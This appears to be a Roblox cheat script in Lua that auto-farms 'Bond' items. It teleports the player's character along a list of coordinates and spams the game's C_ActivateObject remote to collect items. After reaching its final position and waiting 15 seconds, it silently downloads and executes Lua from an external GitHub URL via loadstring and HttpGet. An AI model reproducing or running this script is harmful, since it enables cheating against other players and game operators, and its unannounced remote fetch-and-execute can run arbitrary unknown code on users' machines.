local positions = {
    Vector3.new(57, 3, 30000), Vector3.new(57, 3, 28000),
    Vector3.new(57, 3, 26000), Vector3.new(57, 3, 24000),
    Vector3.new(57, 3, 22000), Vector3.new(57, 3, 20000),
    Vector3.new(57, 3, 18000), Vector3.new(57, 3, 16000),
    Vector3.new(57, 3, 14000), Vector3.new(57, 3, 12000),
    Vector3.new(57, 3, 10000), Vector3.new(57, 3, 8000),
    Vector3.new(57, 3, 6000), Vector3.new(57, 3, 4000),
    Vector3.new(57, 3, 2000), Vector3.new(57, 3, 0),
    Vector3.new(57, 3, -2000), Vector3.new(57, 3, -4000),
    Vector3.new(57, 3, -6000), Vector3.new(57, 3, -8000),
    Vector3.new(57, 3, -10000), Vector3.new(57, 3, -12000),
    Vector3.new(57, 3, -14000), Vector3.new(57, 3, -16000),
    Vector3.new(57, 3, -18000), Vector3.new(57, 3, -20000),
    Vector3.new(57, 3, -22000), Vector3.new(57, 3, -24000),
    Vector3.new(57, 3, -26000), Vector3.new(57, 3, -28000),
    Vector3.new(57, 3, -30000), Vector3.new(57, 3, -32000),
    Vector3.new(57, 3, -34000), Vector3.new(57, 3, -36000),
    Vector3.new(57, 3, -38000), Vector3.new(57, 3, -40000),
    Vector3.new(57, 3, -42000), Vector3.new(57, 3, -44000),
    Vector3.new(57, 3, -46000), Vector3.new(57, 3, -48000),
    Vector3.new(-434, 3, -48998)
}

local duration = 0.9
local bondPauseDuration = 0.9

local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")

local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player:FindFirstChildOfClass("PlayerGui")

local bondCounter = Instance.new("TextLabel")
bondCounter.Size = UDim2.new(0.3, 0, 0.1, 0)
bondCounter.Position = UDim2.new(0.5, 0, 0.7, 0)
bondCounter.AnchorPoint = Vector2.new(0.5, 0.5)
bondCounter.BackgroundTransparency = 0.5
bondCounter.TextScaled = true
bondCounter.Font = Enum.Font.SourceSansBold
bondCounter.TextColor3 = Color3.fromRGB(255, 255, 255)
bondCounter.Text = "Bonds Found: 0"
bondCounter.Parent = screenGui

task.spawn(function()
    task.wait(1)
    screenGui:Destroy()
end)

local foundBonds = {}
local bondCount = 0

local function updateBondCount()
    bondCounter.Text = "Bonds Found: " .. tostring(bondCount)
end

local function safeTeleport(position)
    pcall(function()
        hrp.CFrame = CFrame.new(position) -- Changed Position to CFrame
    end)
end

task.spawn(function()
    for _, pos in ipairs(positions) do
        safeTeleport(pos)
        task.wait(duration)

        if pos == Vector3.new(-434, 3, -48998) then
            print("Reached final position, waiting 15 seconds...")
            task.wait(15) -- Wait before executing loadstring
            loadstring(game:HttpGet("https://raw.githubusercontent.com/ewewe514/lowserver.github.io/refs/heads/main/lowserver.lua"))()
            print("Executed loadstring after 15 seconds.")
        end

        local bonds = workspace.RuntimeItems:GetChildren()

        for _, bond in ipairs(bonds) do
            if bond:IsA("Model") and bond.PrimaryPart and (bond.Name == "Bond" or bond.Name == "Bonds") then
                local bondPos = bond.PrimaryPart.Position
                local alreadyVisited = false

                for _, storedPos in ipairs(foundBonds) do
                    if (bondPos - storedPos).Magnitude < 1 then
                        alreadyVisited = true
                        break
                    end
                end

                if not alreadyVisited then
                    table.insert(foundBonds, bondPos)
                    bondCount = bondCount + 1
                    safeTeleport(bondPos)
                    print("Bond found! Teleporting to " .. tostring(bondPos))
                    task.wait(bondPauseDuration)

                    updateBondCount()
                    safeTeleport(pos)
                end
            end
        end
    end
end)

task.spawn(function()
    while true do
        local activateRemote = game:GetService("ReplicatedStorage"):WaitForChild("Shared"):WaitForChild("Network"):WaitForChild("RemotePromise"):WaitForChild("Remotes"):FindFirstChild("C_ActivateObject")

        if activateRemote then
            local runtimeItems = game.Workspace:WaitForChild("RuntimeItems")

            for _, bond in pairs(runtimeItems:GetChildren()) do
                if bond:IsA("Model") and (bond.Name == "Bond" or bond.Name == "Bonds") and bond.PrimaryPart then
                    activateRemote:FireServer(bond)
                end
            end
        end
        task.wait(0.1) -- Adding delay between activations
    end
end)
